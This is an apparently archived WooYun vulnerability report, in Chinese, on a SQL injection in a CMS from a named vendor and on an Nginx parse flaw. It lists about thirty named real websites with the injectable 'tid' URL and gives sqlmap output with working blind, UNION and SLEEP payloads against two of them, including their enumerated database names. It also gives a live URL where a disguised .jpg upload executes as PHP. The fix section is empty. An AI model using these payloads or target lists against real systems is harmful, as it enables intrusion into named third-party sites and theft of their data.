wybug_title: 某建站系统通用型SQL盲注一枚+解析漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-10-17：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-01-15：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 213231 详细说明：  1.众宇科技（http://www.nbzytech.com/）开发的某套CMS程序用于多数网站，遗漏了一个注入。存在注入参数:tid漏洞存在页面:http://www.pinnacles.cc/cn/products.php?tid=3http://www.china-south.net/cn/products.php?tid=15http://www.angricht.com/cn/products.php?tid=54http://www.beifa.com/cn/products.php?tid=98http://www.chinafirs.com/products.php?tid=1http://www.mamabebe.cn/cn/products.php?tid=8http://www.cn-moeller.com/cn/products.php?tid=14http://www.3wen365.com/cn/products.php?tid=25http://www.yourlonglighting.com/cn/products.php?tid=39http://www.blxinyu.com/products.php?tid=4http://www.austinelec.com/cn/products.php?tid=9http://www.nbopen.net/products.php?tid=30http://www.nbxjqd.com/cn/products.php?tid=1http://www.jinhenglihe.com/products.php?tid=36http://www.nbbhqy.com/cn/products.php?tid=2&page=2http://www.nbxxmc.com/cn/products.php?tid=3http://www.nbyuandian.com/cn/products.php?tid=3http://www.nbnyjx.com/products.php?tid=17http://www.xishisw.com/cn/products.php?tid=2http://test.nbzytech.com/hongxuan/cn/products.php?tid=3&page=3http://www.cicidz.com/cn/products.php?tid=5http://www.shengyate.com/cn/products.php?tid=30http://www.nbxhjd.com/products.php?tid=8http://www.nbgfsg.com/cn/products.php?tid=1http://www.npjet.com/products.php?tid=2http://www.nbmkty.com/cn/products.php?tid=11http://www.nbdayue.com/cn/products.php?tid=3http://www.nbqhhl.com/cn/products.php?tid=5http://www.krosor.com/cn/products.php?tid=8   漏洞证明：  我找几个去试试。
GET parameter 'tid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Nsqlmap identified the following injection points with a total of 42 HTTP(s) requests:---Place: GETParameter: tid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tid=8) AND 5753=5753 AND (5638=5638    Type: UNION query    Title: MySQL UNION query (NULL) - 27 columns    Payload: tid=8) UNION ALL SELECT NULL,CONCAT(0x7162766471,0x707742725948654a4a65,0x7179726a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: tid=8) AND SLEEP(5) AND (8021=8021---[14:35:30] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.2, Nginxback-end DBMS: MySQL 5.0.11[14:35:30] [INFO] fetching database namesavailable databases [2]:[*] danmai[*] information_schema[14:35:30] [INFO] fetched data logged to text files under 'C:\Documents and Settings\Administrator\.sqlmap\output\www.krosor.com'GET parameter 'tid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Nsqlmap identified the following injection points with a total of 46 HTTP(s) requests:---Place: GETParameter: tid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tid=5) AND 4651=4651 AND (2916=2916    Type: UNION query    Title: MySQL UNION query (NULL) - 26 columns    Payload: tid=5) UNION ALL SELECT NULL,CONCAT(0x716e7a6571,0x6756636d4c746867776e,0x7169707571),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: tid=5) AND SLEEP(5) AND (4017=4017---[14:48:02] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.2, Nginxback-end DBMS: MySQL 5.0.11[14:48:02] [INFO] fetching database namesavailable databases [2]:[*] information_schema[*] qianhai[14:48:02] [INFO] fetched data logged to text files under 'C:\Documents and Settings\Administrator\.sqlmap\output\www.nbqhhl.com'
2.接下来我们看看解析的，所有网站都是Nginx低版本的,所以造成解析漏洞。首先我建立一个 1.jpg图片格式文件里面写上 phpinfo看图如下。

然后登陆一个后台。去找地方传图片。





ok、解析成功、、http://www.jinhenglihe.com/upload/2014092815291641.jpg/1.php   修复方案：  然后测试一下把，审核能不能给多点RMB   版权声明：转载请注明来源 老和尚@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
